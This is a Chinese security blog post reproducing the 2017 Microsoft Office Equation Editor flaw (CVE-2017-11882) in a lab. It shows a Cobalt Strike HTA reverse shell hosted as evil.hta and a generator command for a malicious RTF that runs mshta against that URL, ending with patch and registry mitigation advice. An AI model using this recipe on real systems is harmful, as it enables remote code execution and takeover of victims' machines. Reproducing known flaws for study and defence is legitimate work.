<!doctype html><html><head><meta charset=utf-8><meta http-equiv=X-UA-Compatible content="IE=edge"><title>CVE-2017-11882漏洞复现 - 倾旋的博客</title><meta name=viewport content="width=device-width,initial-scale=1">
<link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/normalize.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/main.css><link rel=stylesheet type=text/css media=screen href=https://payloads.online/css/extra.css><link id=dark-scheme rel=stylesheet type=text/css href=https://payloads.online/css/dark.css><script src=https://payloads.online/js/feather.min.js></script><script src=https://payloads.online/js/main.js></script><link rel=stylesheet href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans:wght@400;500;600;700&family=JetBrains+Mono:wght@400;500&family=Inter:wght@400;500;600;700&display=swap"><link rel=stylesheet href=/css/fontawesome.css></head><body><div class="container wrapper"><div class=header><div class=avatar><a href=https://payloads.online/><img src=/avatar.jpeg alt=倾旋的博客></a></div><h1 class=site-title><a href=https://payloads.online/>倾旋的博客</a></h1><div class=site-description><p>现阶段在进行有效性验证/攻击模拟相关的安全研究工作，我的博客会记录一些我的学习过程和部分安全技术研究成果。</p><nav class="nav social"><ul class=flat><li><a href=https://github.com/rvn0xsy/ title=Github><i data-feather=github></i></a></li><li><a href=/index.xml title=RSS><i data-feather=rss></i></a></li><li><a href=/ title=Wechat><i data-feather=message-circle></i></a></li><span class=scheme-toggle><a href=# id=scheme-toggle></a></ul></nav></div><nav class=nav><ul class=flat><li><a href=/>首页</a></li><li><a href=/posts/>文章列表</a></li><li><a href=/tags>标签</a></li><li><a href=/projects>开源项目</a></li><li><a href=/about>关于我</a></li><li><a href=/links/>友情链接</a></li><li><a href=/message>留言</a></li><li><a href=/sponsor>赞助</a></li></ul></nav></div><div class=post><div class=post-header><div class=meta><div class=date><span class=day>21</span>
<span class=rest>Nov 2017</span></div></div><div class=matter><h1 class=title>CVE-2017-11882漏洞复现</h1></div></div><h2 id=0x00-前言>0x00 前言</h2><p>参考backlion师傅的PDF，记录一下这个过程。</p><p>2017年11月14日，微软发布了11月份的安全补丁更新，其中比较引人关注的莫过于悄然修复了潜伏17年之久的Office远程代码执行漏洞（CVE-2017-11882）。该漏洞为Office内存破坏漏洞，影响目前流行的所有Office版本。攻击者可以利用漏洞以当前登录的用户的身份执行任意命令。
由于漏洞影响面较广，漏洞披露后，金睛安全研究团队持续对漏洞相关攻击事件进行关注。11月19日，监控到了已有漏洞POC在网上流传，随即迅速对相关样本进行了分析。目前该样本全球仅微软杀毒可以检测。</p><ul><li>漏洞影响版本：</li><li>Office 365</li><li>Microsoft Office 2000</li><li>Microsoft Office 2003</li><li>Microsoft Office 2007 Service Pack 3</li><li>Microsoft Office 2010 Service Pack 2</li><li>Microsoft Office 2013 Service Pack 1</li><li>Microsoft Office 2016</li></ul><h2 id=0x01-环境清单>0x01 环境清单</h2><ul><li>WindowsServer 2008 (192.168.3.114)</li><li>Office 2007</li><li>MAC OSX(192.168.3.106)</li></ul><h2 id=0x02-复现过程>0X02 复现过程</h2><h3 id=使用cobalt-strike生成hta反弹shell>使用Cobalt Strike生成hta反弹shell</h3><p><img src=https://images.payloads.online/eca6cc68-4f5e-11ec-9ca9-00d861bf4abb.png alt=生成></p><p>将生成的hta文档放入WebServer根目录：http://192.168.3.106/evil.hta</p><p>我(Cobalt Strike)本地监听了一个8081端口，用来接收客户端的Shell</p><h3 id=生成一个rtfdoc文档>生成一个rtf/doc文档</h3><p>github上已有生成脚本</p><p><code>webdav_exec_CVE-2017-11882.py</code> 地址： <a href=http://payloads.online/tools/cve-2017-11882/webdav_exec_CVE-2017-11882.py>http://payloads.online/tools/cve-2017-11882/webdav_exec_CVE-2017-11882.py</a></p><p>生成rtf文档：</p><div class=highlight><div style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><table style=border-spacing:0;padding:0;margin:0;border:0><tr><td style=vertical-align:top;padding:0;margin:0;border:0><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">1
</span><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:.4em;padding:0 .4em;color:#7f7f7f">2
</span></code></pre></td><td style=vertical-align:top;padding:0;margin:0;border:0;width:100%><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-fallback data-lang=fallback><span style=display:flex><span>python webdav_exec_CVE-2017-11882.py -u http://192.168.3.106/evil.hta -e &#34;mshta http://192.168.3.106/evil.hta&#34; -o test.rtf
</span></span><span style=display:flex><span>!!! Completed !!!
</span></span></code></pre></td></tr></table></div></div><p>最后将test.rtf在目标机器上执行 <code>=_=||</code>，其实可以实战的，对于APT的帮助很大</p><h3 id=结果>结果</h3><p>目标机器上执行后，我们可以在Cobalt Strike看到来自客户端的会话</p><p><img src=https://images.payloads.online/ed07c464-4f5e-11ec-8978-00d861bf4abb.png alt=shell></p><h2 id=0x03-修复建议>0x03 修复建议</h2><p>1、微软已经对此漏洞做出了修复。</p><ul><li>下载<code>https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2017-11882</code> 更新补丁进行修补</li><li>开启Windows Update功能，定期对系统进行自动更新</li></ul><p>2、由于该公式编辑器已经17年未做更新，可能存在大量安全漏洞，建议在注册表中取消该模块的注册。</p><ul><li>按下Win R组合键，打开cmd.exe</li><li>输入以下两条命令：
<code>reg add “HKLM\SOFTWARE\Microsoft\Office\Common\COM Compatibility\{0002CE02-0000-0000-C000-000000000046} ” /v “Compatibility Flags” /t REG_DWORD /d 0x400</code></li></ul><hr class=footer-separator><div class=tags></div><div class=back><a href=https://payloads.online/><span aria-hidden=true>← Back</span></a></div><div class=back></div></div><div class=post><script src=https://giscus.app/client.js data-repo=Rvn0xsy/rvn0xsy.github.io data-repo-id="MDEwOlJlcG9zaXRvcnk0MDEyMzI3MTY=" data-category=General data-category-id=DIC_kwDOF-pTTM4CRDk_ data-mapping=title data-strict=0 data-reactions-enabled=1 data-emit-metadata=0 data-input-position=bottom data-theme=light_protanopia data-lang=zh-CN data-loading=lazy crossorigin=anonymous async></script></div></div><div class="footer wrapper"><nav class=nav><div>2024 倾旋 All rights reserved</div></nav></div><script>feather.replace()</script></body></html>